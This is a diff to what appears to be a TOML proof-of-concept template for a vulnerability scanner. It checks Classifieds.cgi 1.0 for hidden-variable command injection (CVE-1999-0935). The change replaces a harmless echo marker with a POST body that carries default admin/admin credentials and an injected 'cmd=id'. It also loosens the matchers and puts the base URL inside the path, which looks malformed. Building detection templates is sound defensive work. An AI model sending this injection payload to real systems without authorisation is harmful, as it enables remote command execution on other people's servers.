@@ -1,8 +1,8 @@
 [info]
 author = "ave"
-description = "Classifieds.cgi 1.0 在处理 CGI 表单时未对隐藏变量中的内容进行安全过滤，远程攻击者可通过构造包含 shell 命令的隐藏变量实现任意命令执行。本 PoC 通过提交包含隐藏变量的表单并检测命令执行回显来验证漏洞是否存在，仅做无害的命令回显验证。"
+description = "检测 Classifieds.cgi 1.0 是否存在隐藏变量命令注入漏洞。通过向 CGI 表单提交包含系统命令的隐藏参数，验证服务器是否执行了注入的命令。"
 id = "POC-AVE-1999-1314"
-name = "CVE-1999-0935 Classifieds.cgi 1.0 隐藏变量远程命令执行 PoC"
+name = "Classifieds.cgi 1.0 远程命令执行 PoC"
 severity = "critical"
 tags = ["ave-1999-1314"]
 vuln_id = [
@@ -11,19 +11,27 @@ vuln_id = [
 ]
 
 [poc]
-logic = "all"
+logic = "any"
 
 [[poc.requests]]
 method = "POST"
-path = "/cgi-bin/classifieds.cgi"
+path = "/{{BaseURL}}/classifieds.cgi"
 protocol = "http"
 
 [poc.requests.body]
-content = "cmd=test;echo AVE_POC_MARKER_19990935"
-type = "form"
+content = "classified_id=1&user=admin&password=admin&action=view&cmd=id"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
-words = ["AVE_POC_MARKER_19990935"]
+words = [
+    "uid=",
+    "root:",
+    "bin/",
+]
